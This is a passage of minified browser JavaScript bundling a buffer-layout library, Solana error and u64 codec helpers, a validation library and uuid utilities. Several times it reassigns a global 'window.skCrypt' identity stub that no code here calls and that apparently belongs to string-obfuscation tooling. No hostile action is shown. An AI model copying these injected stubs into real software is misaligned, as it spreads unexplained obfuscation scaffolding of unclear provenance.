          throw new TypeError("elementLayout must be a Layout");
        if (
          !((e instanceof i && e.isCount()) || (Number.isInteger(e) && 0 <= e))
        )
          throw new TypeError(
            "count must be non-negative integer or an unsigned integer ExternalLayout"
          );
        let o = -1;
        !(e instanceof i) && 0 < t.span && (o = e * t.span),
          super(o, n),
          (this.elementLayout = t),
          (this.count = e);
      }
      getSpan(t, e = 0) {
        if (0 <= this.span) return this.span;
        let n = 0,
          r = this.count;
        if (
          (r instanceof i && (r = r.decode(t, e)), 0 < this.elementLayout.span)
        )
          n = r * this.elementLayout.span;
        else {
          let o = 0;
          for (; o < r; ) (n += this.elementLayout.getSpan(t, e + n)), ++o;
        }
        return n;
      }
      decode(t, e = 0) {
        const n = [];
        let r = 0,
          o = this.count;
        for (o instanceof i && (o = o.decode(t, e)); r < o; )
          n.push(this.elementLayout.decode(t, e)),
            (e += this.elementLayout.getSpan(t, e)),
            (r += 1);
        return n;
      }
      encode(t, e, n = 0) {
        const r = this.elementLayout,
          o = t.reduce((t, o) => t + r.encode(o, e, n + t), 0);
        return this.count instanceof i && this.count.encode(t.length, e, n), o;
      }
    }
    Tr.Sequence = I;
    class S extends r {
      constructor(t, e, n) {
        if (!Array.isArray(t) || !t.reduce((t, e) => t && e instanceof r, !0))
          throw new TypeError("fields must be array of Layout instances");
        "boolean" == typeof e && void 0 === n && ((n = e), (e = void 0));
        for (const r of t)
          if (0 > r.span && void 0 === r.property)
            throw new Error(
              "fields cannot contain unnamed variable-length layout"
            );
        let o = -1;
        try {
          o = t.reduce((t, e) => t + e.getSpan(), 0);
        } catch (i) {}
        super(o, e), (this.fields = t), (this.decodePrefixes = !!n);
      }
      getSpan(t, e = 0) {
        if (0 <= this.span) return this.span;
        let n = 0;
        try {
          n = this.fields.reduce((n, r) => {
            const o = r.getSpan(t, e);
            return (e += o), n + o;
          }, 0);
        } catch (r) {
          throw new RangeError("indeterminate span");
        }
        return n;
      }
      decode(t, n = 0) {
        e(t);
        const r = this.makeDestinationObject();
        for (const e of this.fields)
          if (
            (void 0 !== e.property && (r[e.property] = e.decode(t, n)),
            (n += e.getSpan(t, n)),
            this.decodePrefixes && t.length === n)
          )
            break;
        return r;
      }
      encode(t, e, n = 0) {
        const r = n;
        let o = 0,
          i = 0;
        for (const s of this.fields) {
          let r = s.span;
          if (((i = 0 < r ? r : 0), void 0 !== s.property)) {
            const o = t[s.property];
            void 0 !== o &&
              ((i = s.encode(o, e, n)), 0 > r && (r = s.getSpan(e, n)));
          }
          (o = n), (n += r);
        }
        return o + i - r;
      }
      fromArray(t) {
        const e = this.makeDestinationObject();
        for (const n of this.fields)
          void 0 !== n.property && 0 < t.length && (e[n.property] = t.shift());
        return e;
      }
      layoutFor(t) {
        if ("string" != typeof t)
          throw new TypeError("property must be string");
        for (const e of this.fields) if (e.property === t) return e;
      }
      offsetOf(t) {
        if ("string" != typeof t)
          throw new TypeError("property must be string");
        let e = 0;
        for (const n of this.fields) {
          if (n.property === t) return e;
          0 > n.span ? (e = -1) : 0 <= e && (e += n.span);
        }
      }
    }
    Tr.Structure = S;
    class _ {
      constructor(t) {
        this.property = t;
      }
      decode(t, e) {
        throw new Error("UnionDiscriminator is abstract");
      }
      encode(t, e, n) {
        throw new Error("UnionDiscriminator is abstract");
      }
    }
    Tr.UnionDiscriminator = _;
    class T extends _ {
      constructor(t, e) {
        if (!(t instanceof i && t.isCount()))
          throw new TypeError(
            "layout must be an unsigned integer ExternalLayout"
          );
        super(e || t.property || "variant"), (this.layout = t);
      }
      decode(t, e) {
        return this.layout.decode(t, e);
      }
      encode(t, e, n) {
        return this.layout.encode(t, e, n);
      }
    }
    Tr.UnionLayoutDiscriminator = T;
    class C extends r {
      constructor(t, e, n) {
        let o;
        if (t instanceof u || t instanceof c) o = new T(new a(t));
        else if (t instanceof i && t.isCount()) o = new T(t);
        else {
          if (!(t instanceof _))
            throw new TypeError(
              "discr must be a UnionDiscriminator or an unsigned integer layout"
            );
          o = t;
        }
        if ((void 0 === e && (e = null), !(null === e || e instanceof r)))
          throw new TypeError("defaultLayout must be null or a Layout");
        if (null !== e) {
          if (0 > e.span)
            throw new Error("defaultLayout must have constant span");
          void 0 === e.property && (e = e.replicate("content"));
        }
        let s = -1;
        e &&
          ((s = e.span),
          0 <= s && (t instanceof u || t instanceof c) && (s += o.layout.span)),
          super(s, n),
          (this.discriminator = o),
          (this.usesPrefixDiscriminator = t instanceof u || t instanceof c),
          (this.defaultLayout = e),
          (this.registry = {});
        let l = this.defaultGetSourceVariant.bind(this);
        (this.getSourceVariant = function (t) {
          return l(t);
        }),
          (this.configGetSourceVariant = function (t) {
            l = t.bind(this);
          });
      }
      getSpan(t, e = 0) {
        if (0 <= this.span) return this.span;
        const n = this.getVariant(t, e);
        if (!n)
          throw new Error("unable to determine span for unrecognized variant");
        return n.getSpan(t, e);
      }
      defaultGetSourceVariant(t) {
        if (
          Object.prototype.hasOwnProperty.call(t, this.discriminator.property)
        ) {
          if (
            this.defaultLayout &&
            this.defaultLayout.property &&
            Object.prototype.hasOwnProperty.call(t, this.defaultLayout.property)
          )
            return;
          const e = this.registry[t[this.discriminator.property]];
          if (
            e &&
            (!e.layout ||
              (e.property &&
                Object.prototype.hasOwnProperty.call(t, e.property)))
          )
            return e;
        } else
          for (const e in this.registry) {
            const n = this.registry[e];
            if (
              n.property &&
              Object.prototype.hasOwnProperty.call(t, n.property)
            )
              return n;
          }
        throw new Error("unable to infer src variant");
      }
      decode(t, e = 0) {
        let n;
        const r = this.discriminator,
          o = r.decode(t, e),
          i = this.registry[o];
        if (void 0 === i) {
          const i = this.defaultLayout;
          let s = 0;
          this.usesPrefixDiscriminator && (s = r.layout.span),
            (n = this.makeDestinationObject()),
            (n[r.property] = o),
            (n[i.property] = i.decode(t, e + s));
        } else n = i.decode(t, e);
        return n;
      }
      encode(t, e, n = 0) {
        const r = this.getSourceVariant(t);
        if (void 0 === r) {
          const r = this.discriminator,
            o = this.defaultLayout;
          let i = 0;
          return (
            this.usesPrefixDiscriminator && (i = r.layout.span),
            r.encode(t[r.property], e, n),
            i + o.encode(t[o.property], e, n + i)
          );
        }
        return r.encode(t, e, n);
      }
      addVariant(t, e, n) {
        const r = new B(this, t, e, n);
        return (this.registry[t] = r), r;
      }
      getVariant(t, e = 0) {
        let n;
        return (
          (n = t instanceof Uint8Array ? this.discriminator.decode(t, e) : t),
          this.registry[n]
        );
      }
    }
    Tr.Union = C;
    class B extends r {
      constructor(t, e, n, o) {
        if (!(t instanceof C)) throw new TypeError("union must be a Union");
        if (!Number.isInteger(e) || 0 > e)
          throw new TypeError("variant must be a (non-negative) integer");
        if (
          ("string" == typeof n && void 0 === o && ((o = n), (n = null)), n)
        ) {
          if (!(n instanceof r)) throw new TypeError("layout must be a Layout");
          if (
            null !== t.defaultLayout &&
            0 <= n.span &&
            n.span > t.defaultLayout.span
          )
            throw new Error("variant span exceeds span of containing union");
          if ("string" != typeof o)
            throw new TypeError("variant must have a String property");
        }
        let i = t.span;
        0 > t.span &&
          ((i = n ? n.span : 0),
          0 <= i &&
            t.usesPrefixDiscriminator &&
            (i += t.discriminator.layout.span)),
          super(i, o),
          (this.union = t),
          (this.variant = e),
          (this.layout = n || null);
      }
      getSpan(t, e = 0) {
        if (0 <= this.span) return this.span;
        let n = 0;
        this.union.usesPrefixDiscriminator &&
          (n = this.union.discriminator.layout.span);
        let r = 0;
        return this.layout && (r = this.layout.getSpan(t, e + n)), n + r;
      }
      decode(t, e = 0) {
        const n = this.makeDestinationObject();
        if (this !== this.union.getVariant(t, e))
          throw new Error("variant mismatch");
        let r = 0;
        return (
          this.union.usesPrefixDiscriminator &&
            (r = this.union.discriminator.layout.span),
          this.layout
            ? (n[this.property] = this.layout.decode(t, e + r))
            : this.property
            ? (n[this.property] = !0)
            : this.union.usesPrefixDiscriminator &&
              (n[this.union.discriminator.property] = this.variant),
          n
        );
      }
      encode(t, e, n = 0) {
        let r = 0;
        if (
          (this.union.usesPrefixDiscriminator &&
            (r = this.union.discriminator.layout.span),
          this.layout &&
            !Object.prototype.hasOwnProperty.call(t, this.property))
        )
          throw new TypeError("variant lacks property " + this.property);
        this.union.discriminator.encode(this.variant, e, n);
        let o = r;
        if (
          this.layout &&
          (this.layout.encode(t[this.property], e, n + r),
          (o += this.layout.getSpan(e, n + r)),
          0 <= this.union.span && o > this.union.span)
        )
          throw new Error("encoded variant overruns containing union");
        return o;
      }
      fromArray(t) {
        if (this.layout) return this.layout.fromArray(t);
      }
    }
    function E(t) {
      return 0 > t && (t += 4294967296), t;
    }
    Tr.VariantLayout = B;
    class x extends r {
      constructor(t, e, n) {
        if (!(t instanceof u || t instanceof c))
          throw new TypeError("word must be a UInt or UIntBE layout");
        if (
          ("string" == typeof e && void 0 === n && ((n = e), (e = !1)),
          4 < t.span)
        )
          throw new RangeError("word cannot exceed 32 bits");
        super(t.span, n), (this.word = t), (this.msb = !!e), (this.fields = []);
        let r = 0;
        (this._packedSetValue = function (t) {
          return (r = E(t)), this;
        }),
          (this._packedGetValue = function () {
            return r;
          });
      }
      decode(t, e = 0) {
        const n = this.makeDestinationObject(),
          r = this.word.decode(t, e);
        this._packedSetValue(r);
        for (const o of this.fields)
          void 0 !== o.property && (n[o.property] = o.decode(t));
        return n;
      }
      encode(t, e, n = 0) {
        const r = this.word.decode(e, n);
        this._packedSetValue(r);
        for (const o of this.fields)
          if (void 0 !== o.property) {
            const e = t[o.property];
            void 0 !== e && o.encode(e);
          }
        return this.word.encode(this._packedGetValue(), e, n);
      }
      addField(t, e) {
        const n = new P(this, t, e);
        return this.fields.push(n), n;
      }
      addBoolean(t) {
        const e = new R(this, t);
        return this.fields.push(e), e;
      }
      fieldFor(t) {
        if ("string" != typeof t)
          throw new TypeError("property must be string");
        for (const e of this.fields) if (e.property === t) return e;
      }
    }
    Tr.BitStructure = x;
    class P {
      constructor(t, e, n) {
        if (!(t instanceof x))
          throw new TypeError("container must be a BitStructure");
        if (!Number.isInteger(e) || 0 >= e)
          throw new TypeError("bits must be positive integer");
        const r = 8 * t.span,
          o = t.fields.reduce((t, e) => t + e.bits, 0);
        if (e + o > r)
          throw new Error(
            "bits too long for span remainder (" +
              (r - o) +
              " of " +
              r +
              " remain)"
          );
        (this.container = t),
          (this.bits = e),
          (this.valueMask = (1 << e) - 1),
          32 === e && (this.valueMask = 4294967295),
          (this.start = o),
          this.container.msb && (this.start = r - o - e),
          (this.wordMask = E(this.valueMask << this.start)),
          (this.property = n);
      }
      decode(t, e) {
        return (
          E(this.container._packedGetValue() & this.wordMask) >>> this.start
        );
      }
      encode(t) {
        if (
          "number" != typeof t ||
          !Number.isInteger(t) ||
          t !== E(t & this.valueMask)
        )
          throw new TypeError(
            o("BitField.encode", this) +
              " value must be integer not exceeding " +
              this.valueMask
          );
        const e = this.container._packedGetValue(),
          n = E(t << this.start);
        this.container._packedSetValue(E(e & ~this.wordMask) | n);
      }
    }
    Tr.BitField = P;
    class R extends P {
      constructor(t, e) {
        super(t, 1, e);
      }
      decode(t, e) {
        return !!super.decode(t, e);
      }
      encode(t) {
        "boolean" == typeof t && (t = +t), super.encode(t);
      }
    }
    Tr.Boolean = R;
    class O extends r {
      constructor(t, e) {
        if (
          !((t instanceof i && t.isCount()) || (Number.isInteger(t) && 0 <= t))
        )
          throw new TypeError(
            "length must be positive integer or an unsigned integer ExternalLayout"
          );
        let n = -1;
        t instanceof i || (n = t), super(n, e), (this.length = t);
      }
      getSpan(t, e) {
        let n = this.span;
        return 0 > n && (n = this.length.decode(t, e)), n;
      }
      decode(t, e = 0) {
        let r = this.span;
        return 0 > r && (r = this.length.decode(t, e)), n(t).slice(e, e + r);
      }
      encode(t, e, r) {
        let s = this.length;
        if (
          (this.length instanceof i && (s = t.length),
          !(t instanceof Uint8Array && s === t.length))
        )
          throw new TypeError(
            o("Blob.encode", this) +
              " requires (length " +
              s +
              ") Uint8Array as src"
          );
        if (r + s > e.length)
          throw new RangeError("encoding overruns Uint8Array");
        const a = n(t);
        return (
          n(e).write(a.toString("hex"), r, s, "hex"),
          this.length instanceof i && this.length.encode(s, e, r),
          s
        );
      }
    }
    Tr.Blob = O;
    class M extends r {
      constructor(t) {
        super(-1, t);
      }
      getSpan(t, n = 0) {
        e(t);
        let r = n;
        for (; r < t.length && 0 !== t[r]; ) r += 1;
        return 1 + r - n;
      }
      decode(t, e = 0) {
        const r = this.getSpan(t, e);
        return n(t)
          .slice(e, e + r - 1)
          .toString("utf-8");
      }
      encode(e, r, o = 0) {
        "string" != typeof e && (e = String(e));
        const i = t.Buffer.from(e, "utf8"),
          s = i.length;
        if (o + s > r.length) throw new RangeError("encoding overruns Buffer");
        const a = n(r);
        return i.copy(a, o), (a[o + s] = 0), s + 1;
      }
    }
    Tr.CString = M;
    class L extends r {
      constructor(t, e) {
        if (
          ("string" == typeof t && void 0 === e && ((e = t), (t = void 0)),
          void 0 === t)
        )
          t = -1;
        else if (!Number.isInteger(t))
          throw new TypeError("maxSpan must be an integer");
        super(-1, e), (this.maxSpan = t);
      }
      getSpan(t, n = 0) {
        return e(t), t.length - n;
      }
      decode(t, e = 0) {
        const r = this.getSpan(t, e);
        if (0 <= this.maxSpan && this.maxSpan < r)
          throw new RangeError("text length exceeds maxSpan");
        return n(t)
          .slice(e, e + r)
          .toString("utf-8");
      }
      encode(e, r, o = 0) {
        "string" != typeof e && (e = String(e));
        const i = t.Buffer.from(e, "utf8"),
          s = i.length;
        if (0 <= this.maxSpan && this.maxSpan < s)
          throw new RangeError("text length exceeds maxSpan");
        if (o + s > r.length) throw new RangeError("encoding overruns Buffer");
        return i.copy(n(r), o), s;
      }
    }
    Tr.UTF8 = L;
    class N extends r {
      constructor(t, e) {
        super(0, e), (this.value = t);
      }
      decode(t, e) {
        return this.value;
      }
      encode(t, e, n) {
        return 0;
      }
    }
    return (
      (Tr.Constant = N),
      (Tr.greedy = (t, e) => new s(t, e)),
      (Tr.offset = (t, e, n) => new a(t, e, n)),
      (Tr.u8 = (t) => new u(1, t)),
      (Tr.u16 = (t) => new u(2, t)),
      (Tr.u24 = (t) => new u(3, t)),
      (Tr.u32 = (t) => new u(4, t)),
      (Tr.u40 = (t) => new u(5, t)),
      (Tr.u48 = (t) => new u(6, t)),
      (Tr.nu64 = (t) => new m(t)),
      (Tr.u16be = (t) => new c(2, t)),
      (Tr.u24be = (t) => new c(3, t)),
      (Tr.u32be = (t) => new c(4, t)),
      (Tr.u40be = (t) => new c(5, t)),
      (Tr.u48be = (t) => new c(6, t)),
      (Tr.nu64be = (t) => new g(t)),
      (Tr.s8 = (t) => new l(1, t)),
      (Tr.s16 = (t) => new l(2, t)),
      (Tr.s24 = (t) => new l(3, t)),
      (Tr.s32 = (t) => new l(4, t)),
      (Tr.s40 = (t) => new l(5, t)),
      (Tr.s48 = (t) => new l(6, t)),
      (Tr.ns64 = (t) => new y(t)),
      (Tr.s16be = (t) => new d(2, t)),
      (Tr.s24be = (t) => new d(3, t)),
      (Tr.s32be = (t) => new d(4, t)),
      (Tr.s40be = (t) => new d(5, t)),
      (Tr.s48be = (t) => new d(6, t)),
      (Tr.ns64be = (t) => new w(t)),
      (Tr.f32 = (t) => new b(t)),
      (Tr.f32be = (t) => new v(t)),
      (Tr.f64 = (t) => new A(t)),
      (Tr.f64be = (t) => new k(t)),
      (Tr.struct = (t, e, n) => new S(t, e, n)),
      (Tr.bits = (t, e, n) => new x(t, e, n)),
      (Tr.seq = (t, e, n) => new I(t, e, n)),
      (Tr.union = (t, e, n) => new C(t, e, n)),
      (Tr.unionLayoutDiscriminator = (t, e) => new T(t, e)),
      (Tr.blob = (t, e) => new O(t, e)),
      (Tr.cstr = (t) => new M(t)),
      (Tr.utf8 = (t, e) => new L(t, e)),
      (Tr.constant = (t, e) => new N(t, e)),
      Tr
    );
  })();
  function Br(t) {
    if (Array.isArray(t)) {
      return "%5B" + t.map(Br).join("%2C%20") + "%5D";
    }
    return "bigint" == typeof t
      ? `${t}n`
      : encodeURIComponent(
          String(null != t && null === Object.getPrototypeOf(t) ? { ...t } : t)
        );
  }
  function Er([t, e]) {
    return `${t}=${Br(e)}`;
  }
  function xr(t, e = {}) {
    {
      let n = `Solana error #${t}; Decode this error by running \`npx @solana/errors decode -- ${t}`;
      return (
        Object.keys(e).length &&
          (n += ` '${(function (t) {
            const e = Object.entries(t).map(Er).join("&");
            return btoa(e);
          })(e)}'`),
        `${n}\``
      );
    }
  }
  var Pr = class extends Error {
    constructor(...[t, n]) {
      let r, o;
      if (n) {
        const { cause: t, ...e } = n;
        t && (o = { cause: t }), Object.keys(e).length > 0 && (r = e);
      }
      super(xr(t, r), o),
        e(this, "cause", this.cause),
        e(this, "context"),
        (this.context = { __code: t, ...r }),
        (this.name = "SolanaError");
    }
  };
  function Rr(t) {
    return "fixedSize" in t && "number" == typeof t.fixedSize;
  }
  function Or(t) {
    return 1 !== (null == t ? void 0 : t.endian);
  }
  function Mr(t) {
    return (
      (e = {
        fixedSize: t.size,
        write(e, n, r) {
          t.range &&
            !(function (t, e, n, r) {
              if (r < e || r > n)
                throw new Pr(8078011, {
                  codecDescription: t,
                  max: n,
                  min: e,
                  value: r,
                });
            })(t.name, t.range[0], t.range[1], e);
          const o = new ArrayBuffer(t.size);
          return (
            t.set(new DataView(o), e, Or(t.config)),
            n.set(new Uint8Array(o), r),
            r + t.size
          );
        },
      }),
      Object.freeze({
        ...e,
        encode: (t) => {
          const n = new Uint8Array(
            (function (t, e) {
              return "fixedSize" in e ? e.fixedSize : e.getSizeFromValue(t);
            })(t, e)
          );
          return e.write(t, n, 0), n;
        },
      })
    );
    var e;
  }
  function Lr(t) {
    return (
      (e = {
        fixedSize: t.size,
        read(e, n = 0) {
          !(function (t, e, n = 0) {
            if (e.length - n <= 0)
              throw new Pr(8078e3, { codecDescription: t });
          })(t.name, e, n),
            (function (t, e, n, r = 0) {
              const o = n.length - r;
              if (o < e)
                throw new Pr(8078001, {
                  bytesLength: o,
                  codecDescription: t,
                  expected: e,
                });
            })(t.name, t.size, e, n);
          const r = new DataView(
            (function (t, e, n) {
              const r = t.byteOffset + (e ?? 0),
                o = n ?? t.byteLength;
              return t.buffer.slice(r, r + o);
            })(e, n, t.size)
          );
          return [t.get(r, Or(t.config)), n + t.size];
        },
      }),
      Object.freeze({ ...e, decode: (t, n = 0) => e.read(t, n)[0] })
    );
    var e;
  }
  var Nr = (t = {}) =>
      Mr({
        config: t,
        name: "u64",
        range: [0n, BigInt("0xffffffffffffffff")],
        set: (t, e, n) => t.setBigUint64(0, BigInt(e), n),
        size: 8,
      }),
    Dr = (t = {}) =>
      (function (t, e) {
        if (Rr(t) !== Rr(e)) throw new Pr(8078004);
        if (Rr(t) && Rr(e) && t.fixedSize !== e.fixedSize)
          throw new Pr(8078005, {
            decoderFixedSize: e.fixedSize,
            encoderFixedSize: t.fixedSize,
          });
        if (!Rr(t) && !Rr(e) && t.maxSize !== e.maxSize)
          throw new Pr(8078006, {
            decoderMaxSize: e.maxSize,
            encoderMaxSize: t.maxSize,
          });
        return {
          ...e,
          ...t,
          decode: e.decode,
          encode: t.encode,
          read: e.read,
          write: t.write,
        };
      })(
        Nr(t),
        ((t = {}) =>
          Lr({
            config: t,
            get: (t, e) => t.getBigUint64(0, e),
            name: "u64",
            size: 8,
          }))(t)
      );
  let Ur = class extends TypeError {
    constructor(t, e) {
      let n;
      const { message: r, explanation: o, ...i } = t,
        { path: s } = t,
        a = 0 === s.length ? r : `At path: ${s.join(".")} -- ${r}`;
      super(o ?? a),
        null != o && (this.cause = a),
        Object.assign(this, i),
        (this.name = this.constructor.name),
        (this.failures = () => n ?? (n = [t, ...e()]));
    }
  };
  function qr(t) {
    return "object" == typeof t && null != t;
  }
  function Wr(t) {
    return qr(t) && !Array.isArray(t);
  }
  function zr(t) {
    return "symbol" == typeof t
      ? t.toString()
      : "string" == typeof t
      ? JSON.stringify(t)
      : `${t}`;
  }
  function Kr(t, e, n, r) {
    if (!0 === t) return;
    !1 === t ? (t = {}) : "string" == typeof t && (t = { message: t });
    const { path: o, branch: i } = e,
      { type: s } = n,
      {
        refinement: a,
        message: u = `Expected a value of type \`${s}\`${
          a ? ` with refinement \`${a}\`` : ""
        }, but received: \`${zr(r)}\``,
      } = t;
    return {
      value: r,
      type: s,
      refinement: a,
      key: o[o.length - 1],
      path: o,
      branch: i,
      ...t,
      message: u,
    };
  }
  function* Fr(t, e, n, r) {
    var o;
    (qr((o = t)) && "function" == typeof o[Symbol.iterator]) || (t = [t]);
    for (const i of t) {
      const t = Kr(i, e, n, r);
      t && (yield t);
    }
  }
  function* jr(t, e, n = {}) {
    const { path: r = [], branch: o = [t], coerce: i = !1, mask: s = !1 } = n,
      a = { path: r, branch: o, mask: s };
    i && (t = e.coercer(t, a));
    let u = "valid";
    for (const c of e.validator(t, a))
      (c.explanation = n.message), (u = "not_valid"), yield [c, void 0];
    for (let [c, l, d] of e.entries(t, a)) {
      const e = jr(l, d, {
        path: void 0 === c ? r : [...r, c],
        branch: void 0 === c ? o : [...o, l],
        coerce: i,
        mask: s,
        message: n.message,
      });
      for (const n of e)
        n[0]
          ? ((u = null != n[0].refinement ? "not_refined" : "not_valid"),
            yield [n[0], void 0])
          : i &&
            ((l = n[1]),
            void 0 === c
              ? (t = l)
              : t instanceof Map
              ? t.set(c, l)
              : t instanceof Set
              ? t.add(l)
              : qr(t) && (void 0 !== l || c in t) && (t[c] = l));
    }
    if ("not_valid" !== u)
      for (const c of e.refiner(t, a))
        (c.explanation = n.message), (u = "not_refined"), yield [c, void 0];
    "valid" === u && (yield [void 0, t]);
  }
  let Gr = class {
    constructor(t) {
      const {
        type: e,
        schema: n,
        validator: r,
        refiner: o,
        coercer: i = (t) => t,
        entries: s = function* () {},
      } = t;
      (this.type = e),
        (this.schema = n),
        (this.entries = s),
        (this.coercer = i),
        (this.validator = r ? (t, e) => Fr(r(t, e), e, this, t) : () => []),
        (this.refiner = o ? (t, e) => Fr(o(t, e), e, this, t) : () => []);
    }
    assert(t, e) {
      return Vr(t, this, e);
    }
    create(t, e) {
      return Hr(t, this, e);
    }
    is(t) {
      return Xr(t, this);
    }
    mask(t, e) {
      return (function (t, e, n) {
        const r = Zr(t, e, { coerce: !0, mask: !0, message: n });
        if (r[0]) throw r[0];
        return r[1];
      })(t, this, e);
    }
    validate(t, e = {}) {
      return Zr(t, this, e);
    }
  };
  function Vr(t, e, n) {
    const r = Zr(t, e, { message: n });
    if (r[0]) throw r[0];
  }
  function Hr(t, e, n) {
    const r = Zr(t, e, { coerce: !0, message: n });
    if (r[0]) throw r[0];
    return r[1];
  }
  function Xr(t, e) {
    return !Zr(t, e)[0];
  }
  function Zr(t, e, n = {}) {
    const r = jr(t, e, n),
      o = (function (t) {
        const { done: e, value: n } = t.next();
        return e ? void 0 : n;
      })(r);
    if (o[0]) {
      return [
        new Ur(o[0], function* () {
          for (const t of r) t[0] && (yield t[0]);
        }),
        void 0,
      ];
    }
    return [void 0, o[1]];
  }
  function Jr(t, e) {
    return new Gr({ type: t, schema: null, validator: e });
  }
  function Yr(t) {
    return new Gr({
      type: "array",
      schema: t,
      *entries(e) {
        if (t && Array.isArray(e))
          for (const [n, r] of e.entries()) yield [n, r, t];
      },
      coercer: (t) => (Array.isArray(t) ? t.slice() : t),
      validator: (t) =>
        Array.isArray(t) || `Expected an array value, but received: ${zr(t)}`,
    });
  }
  function Qr() {
    return Jr("boolean", (t) => "boolean" == typeof t);
  }
  function $r(t) {
    return Jr(
      "instance",
      (e) =>
        e instanceof t ||
        `Expected a \`${t.name}\` instance, but received: ${zr(e)}`
    );
  }
  function to(t) {
    const e = zr(t),
      n = typeof t;
    return new Gr({
      type: "literal",
      schema: "string" === n || "number" === n || "boolean" === n ? t : null,
      validator: (n) =>
        n === t || `Expected the literal \`${e}\`, but received: ${zr(n)}`,
    });
  }
  function eo(t) {
    return new Gr({
      ...t,
      validator: (e, n) => null === e || t.validator(e, n),
      refiner: (e, n) => null === e || t.refiner(e, n),
    });
  }
  function no() {
    return Jr(
      "number",
      (t) =>
        ("number" == typeof t && !isNaN(t)) ||
        `Expected a number, but received: ${zr(t)}`
    );
  }
  function ro(t) {
    return new Gr({
      ...t,
      validator: (e, n) => void 0 === e || t.validator(e, n),
      refiner: (e, n) => void 0 === e || t.refiner(e, n),
    });
  }
  function oo(t, e) {
    return new Gr({
      type: "record",
      schema: null,
      *entries(n) {
        if (qr(n))
          for (const r in n) {
            const o = n[r];
            yield [r, r, t], yield [r, o, e];
          }
      },
      validator: (t) => Wr(t) || `Expected an object, but received: ${zr(t)}`,
      coercer: (t) => (Wr(t) ? { ...t } : t),
    });
  }
  function io() {
    return Jr(
      "string",
      (t) => "string" == typeof t || `Expected a string, but received: ${zr(t)}`
    );
  }
  function so(t) {
    const e = Jr("never", () => !1);
    return new Gr({
      type: "tuple",
      schema: null,
      *entries(n) {
        if (Array.isArray(n)) {
          const r = Math.max(t.length, n.length);
          for (let o = 0; o < r; o++) yield [o, n[o], t[o] || e];
        }
      },
      validator: (t) =>
        Array.isArray(t) || `Expected an array, but received: ${zr(t)}`,
      coercer: (t) => (Array.isArray(t) ? t.slice() : t),
    });
  }
  function ao(t) {
    const e = Object.keys(t);
    return new Gr({
      type: "type",
      schema: t,
      *entries(n) {
        if (qr(n)) for (const r of e) yield [r, n[r], t[r]];
      },
      validator: (t) => Wr(t) || `Expected an object, but received: ${zr(t)}`,
      coercer: (t) => (Wr(t) ? { ...t } : t),
    });
  }
  function uo(t) {
    const e = t.map((t) => t.type).join(" | ");
    return new Gr({
      type: "union",
      schema: null,
      coercer(e, n) {
        for (const r of t) {
          const [t, o] = r.validate(e, { coerce: !0, mask: n.mask });
          if (!t) return o;
        }
        return e;
      },
      validator(n, r) {
        const o = [];
        for (const e of t) {
          const [...t] = jr(n, e, r),
            [i] = t;
          if (!i[0]) return [];
          for (const [e] of t) e && o.push(e);
        }
        return [
          `Expected the value to satisfy a union of \`${e}\`, but received: ${zr(
            n
          )}`,
          ...o,
        ];
      },
    });
  }
  function co() {
    return Jr("unknown", () => !0);
  }
  function lo(t, e, n) {
    return new Gr({
      ...t,
      coercer: (r, o) => (Xr(r, e) ? t.coercer(n(r, o), o) : t.coercer(r, o)),
    });
  }
  var fo;
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  var ho = new Uint8Array(16);
  function po() {
    if (
      !fo &&
      !(fo =
        ("undefined" != typeof crypto &&
          crypto.getRandomValues &&
          crypto.getRandomValues.bind(crypto)) ||
        ("undefined" != typeof msCrypto &&
          "function" == typeof msCrypto.getRandomValues &&
          msCrypto.getRandomValues.bind(msCrypto)))
    )
      throw new Error(
        "crypto.getRandomValues() not supported. See https://github.com/uuidjs/uuid#getrandomvalues-not-supported"
      );
    return fo(ho);
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const mo =
    /^(?:[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}|00000000-0000-0000-0000-000000000000)$/i;
  function go(t) {
    return "string" == typeof t && mo.test(t);
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  for (var yo, wo, bo = [], vo = 0; vo < 256; ++vo)
    bo.push((vo + 256).toString(16).substr(1));
  function Ao(t) {
    var e = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0,
      n = (
        bo[t[e + 0]] +
        bo[t[e + 1]] +
        bo[t[e + 2]] +
        bo[t[e + 3]] +
        "-" +
        bo[t[e + 4]] +
        bo[t[e + 5]] +
        "-" +
        bo[t[e + 6]] +
        bo[t[e + 7]] +
        "-" +
        bo[t[e + 8]] +
        bo[t[e + 9]] +
        "-" +
        bo[t[e + 10]] +
        bo[t[e + 11]] +
        bo[t[e + 12]] +
        bo[t[e + 13]] +
        bo[t[e + 14]] +
        bo[t[e + 15]]
      ).toLowerCase();
    if (!go(n)) throw TypeError("Stringified UUID is invalid");
    return n;
  }
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  var ko = 0,
    Io = 0;
  function So(t) {
    if (!go(t)) throw TypeError("Invalid UUID");
    var e,
      n = new Uint8Array(16);
    return (
      (n[0] = (e = parseInt(t.slice(0, 8), 16)) >>> 24),
      (n[1] = (e >>> 16) & 255),
      (n[2] = (e >>> 8) & 255),
      (n[3] = 255 & e),
      (n[4] = (e = parseInt(t.slice(9, 13), 16)) >>> 8),
      (n[5] = 255 & e),
      (n[6] = (e = parseInt(t.slice(14, 18), 16)) >>> 8),
      (n[7] = 255 & e),
      (n[8] = (e = parseInt(t.slice(19, 23), 16)) >>> 8),
      (n[9] = 255 & e),
      (n[10] = ((e = parseInt(t.slice(24, 36), 16)) / 1099511627776) & 255),
      (n[11] = (e / 4294967296) & 255),
      (n[12] = (e >>> 24) & 255),
      (n[13] = (e >>> 16) & 255),
      (n[14] = (e >>> 8) & 255),
      (n[15] = 255 & e),
      n
    );
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  function _o(t, e, n) {
    function r(t, r, o, i) {
      if (
        ("string" == typeof t &&
          (t = (function (t) {
            t = unescape(encodeURIComponent(t));
            for (var e = [], n = 0; n < t.length; ++n) e.push(t.charCodeAt(n));
            return e;
          })(t)),
        "string" == typeof r && (r = So(r)),
        16 !== r.length)
      )
        throw TypeError(
          "Namespace must be array-like (16 iterable integer values, 0-255)"
        );
      var s = new Uint8Array(16 + t.length);
      if (
        (s.set(r),
        s.set(t, r.length),
        ((s = n(s))[6] = (15 & s[6]) | e),
